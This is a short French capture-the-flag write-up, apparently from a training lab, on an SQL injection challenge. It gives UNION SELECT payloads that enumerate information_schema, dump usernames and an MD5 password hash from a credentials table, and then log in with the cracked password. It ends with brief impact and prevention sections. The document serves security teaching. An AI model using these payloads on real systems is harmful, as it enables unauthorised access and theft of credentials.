# SQL Injection - Brute Force

## Description
Cette vulnérabilité exploite une injection SQL pour extraire des informations sensibles de la base de données, notamment les identifiants des utilisateurs / administrateurs.

## Exploitation

### Étape 1: Découverte des tables
Nous utilisons une injection SQL pour récupérer toutes les tables dans toutes les bases de données accessibles :

```sql
1 UNION SELECT table_name, column_name FROM information_schema.columns;
```

### Étape 2: Identification de la table cible
Parmi les résultats, nous identifions une table intéressante : `db_default` qui contient des colonnes prometteuses :
- `id`
- `username`
- `password`

### Étape 3: Localisation de la base de données
Pour identifier dans quelle base de données se trouve notre table cible, on utilise la requête SQL suivante :

```sql
1 UNION SELECT table_schema, table_name FROM information_schema.tables;
```

Cette requête révèle que la table `db_default` se trouve dans la base de données `Member_Brute_Force`.

### Étape 4: Extraction des identifiants
Maintenant que nous connaissons l'emplacement exact, nous extrayons les identifiants :

```sql
1 UNION SELECT username, password FROM Member_Brute_Force.db_default;
```

### Résultats obtenus
- **Username**: `root` / `admin`
- **Password hash (MD5)**: `3bf1114a986ba87ed28fc1b5884fc2f8`
- **Password déchiffré**: `shadow`

### Étape 5: Exploitation finale
Avec les identifiants découverts (`root:shadow` ou `admin:shadow`), nous nous connectons via la page de login pour obtenir le flag.

## Impact
Cette vulnérabilité permet :
- L'accès non autorisé à des comptes utilisateur / administrateur
- L'extraction de données sensibles de la base de données
- La compromission complète de l'application

## Prévention
- Valider et échapper toutes les entrées utilisateur
- Implémenter des contrôles d'accès appropriés
